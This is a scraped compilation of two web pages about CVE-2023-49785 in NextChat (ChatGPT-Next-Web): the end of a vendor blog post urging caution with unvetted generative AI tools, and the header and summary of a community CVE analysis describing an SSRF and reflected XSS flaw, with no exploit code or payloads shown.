Over the last two years, we have observed the rapid pace of development of new generative AI applications, and there is a big appetite to use and experiment with these applications. We’ve also observed a steady blurring of lines between personal use and corporate use. While NextChat is primarily meant for personal use, we’ve seen it in a few of our own client environments.

Security has simply not kept up, both AppSec practices and vulnerability disclosure processes. The focus of the infosec community and media at large has been on “security harms” like prompt injection or model poisoning, but there are lots of high impact, conventional vulnerabilities to be found. We recommend users exercise caution when exposing any unvetted Gen AI tools to the Internet.

### References

* [NextChat, a.k.a ChatGPT-Next-Web](https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web)

##### Sign up for a free trial and quickly verify you’re not exploitable.

[Start Your Free Trial](https://portal.horizon3ai.com)

##### How can NodeZero help you?

Let our experts walk you through a demonstration of NodeZero, so you can see how to put it to work for your company.[Get a Demo](https://www.horizon3.ai/contact-us/schedule-demo/)Share:

[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2021/06/h3-white-logo.png)](https://www.horizon3.ai)Contact Us

### Subscribe to Community Updates

###### NodeZero Solution

* [NodeZero Overview](https://www.horizon3.ai/nodezero/)
* [Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
* [Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
* [External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
* [Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
* [NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
* [Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
* [AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
* [Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
* [NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
* [NodeZero Documentation](https://docs.horizon3.ai/getting_started/)
* [Pentesting for Compliance](https://www.horizon3.ai/compliance/)
* [Pentesting for PCI Compliance](https://www.horizon3.ai/compliance/pci-pentesting/)
* [Pentesting for NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
###### Resources

* [Blog](https://www.horizon3.ai/category/intelligence/blogs/)
* [Attack Research](https://www.horizon3.ai/category/attack-research/)
* [White Papers](https://www.horizon3.ai/category/downloads/whitepapers/)
* [Fact Sheets](https://www.horizon3.ai/category/downloads/factsheets/)
* [Case Studies](https://www.horizon3.ai/category/customer-story/)
* [Glossary](https://www.horizon3.ai/resource-center/glossary/)
###### Use Cases

* [Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
* [Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
* [Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
* [Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
* [Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
* [Large Organization](/who-uses-nodezero/#large-org/)
* [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
* [DIB Suppliers](https://www.horizon3.ai/nsa-capt-program-for-dib-suppliers/)
* [On AWS Marketplace](https://www.horizon3.ai/horizon3-ai-and-aws/)
###### Roles

* [ITOps and SecOps](/who-uses-nodezero/#itops)
* [Security Teams](/who-uses-nodezero/#security-teams)
* [Consulting Pentester](/who-uses-nodezero/#pentesters)
###### Partners

* MSSPs and MSPs
* [Become a Partner](https://www.horizon3.ai/partners/)
* [Partner Portal](https://partners.horizon3.ai/)
###### Company

* [About Us](https://www.horizon3.ai/about-us/)
* [Careers](https://www.horizon3.ai/join-our-team/)
* [Press](https://www.horizon3.ai/category/news/press-release/)
* [Awards](https://www.horizon3.ai/category/news/awards/)
* [Contact](https://www.horizon3.ai/contact-us/)
* [Upcoming Events](https://www.horizon3.ai/events/)
© 2024 All Rights Reserved.
[Privacy Policy](https://www.horizon3.ai/privacy-policy/)[Support Policy](https://www.horizon3.ai/support-policy/)[Terms of Service](https://www.horizon3.ai/terms-of-service/)[Trust Center](https://trust.horizon3.ai/)



=== Content from www.vicarius.io_74db6a6e_20250110_115328.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

 [by @secatgourity](/vsociety/users/secatgourity)12 Apr 2024220728#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Hacking AI Chatbots for fun and learning - Analyzing an unauthenticated SSRF and reflected XSS in ChatGPT-Next-Web (CVE-2023-49785)

 [by @secatgourity](/vsociety/users/secatgourity)22 [by @secatgourity](/vsociety/users/secatgourity)12 Apr 2024220728#cve\_analysis

Write a blog analysis for a CVE

[publish](/vsociety/sign/in)see all related posts
# Hacking AI Chatbots for fun and learning - Analyzing an unauthenticated SSRF and reflected XSS in ChatGPT-Next-Web (CVE-2023-49785)

CVEs

[CVE-2023-49785](/vsociety/vulnerabilities/cve-2023-49785)9.1 Critical Severity
## Screenshots from the blog posts

![images/cluvae4q0c4e41imxamw591g9.jpg](data:image/svg+xml;charset=UTF-8...)![images/cluvae4q0c4e41imxamw591g9.jpg](data:image/svg+xml;charset=UTF-8...)
## Summary

Since last year, the race to develop AI products has led to an explosion in the number of products out in the market. Speed and security have an inverse relation, in a general sense. Therefore, security has seen a great hit and now and then, we notice an AI application having numerous seemingly simple security issues. The same was the case with NextChat, a.k.a ChatGPT-Next-Web, which before version 2.11.3 was vulnerable to an SSRF and a reflected XSS vulnerability. This post aims to help you set up a vulnerable testbed for the same application and perform guided target exploration and exploitation along with the root cause analysis of the vulnerability. The post requires no knowledge of AI and thus can be followed without any fears. All you need is an open mind, some common sense, and a virtual machine (Linux preferably) to hack around with the AI chatbot!

## Description

Tags

[#AI](/vsociety/search?hashtags=ai)[#easy\_to\_exploit](/vsociety/search?hashtags=easy_to_exploit)[#trendingCVE](/vsociety/search?hashtags=trendingcve)[#xss](/vsociety/search?hashtags=xss)[#chatgpt](/vsociety/search?hashtags=chatgpt)[#SSRF](/vsociety/search?hashtags=ssrf)[#unauthenticated](/vsociety/search?hashtags=unauthenticated)[#chatbot](/vsociety/search?hashtags=chatbot)[@secatgourity](/vsociety/users/secatgourity)

190 posts

subscribe to user

Total vcoins

123.8K

Social media links

Shivambathla

show more

 remediate more CVEs with vRx  [explore more](https://www.vicarius.io/?utm_source=vsociety&utm_medium=organic&utm_campaign=cve_scripts%26analysis) Comments (2)submitshow 5 more replies[@secatgourity](/vsociety/users/secatgourity)

190 posts

subscribe to user

Total vcoins

123.8K

Share

Social media links

Shivambathla

show more

CVEs

[CVE-2023-49785](/vsociety/vulnerabilities/cve-2023-49785)9.1 Critical Severity

Tags

[#AI](/vsociety/search?hashtags=ai)[#easy\_to\_exploit](/vsociety/search?hashtags=easy_to_exploit)[#trendingCVE](/vsociety/search?hashtags=trendingcve)[#xss](/vsociety/search?hashtags=xss)[#chatgpt](/vsociety/search?hashtags=chatgpt)[#SSRF](/vsociety/search?hashtags=ssrf)[#unauthenticated](/vsociety/search?hashtags=unauthenticated)[#chatbot](/vsociety/search?hashtags=chatbot)

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)


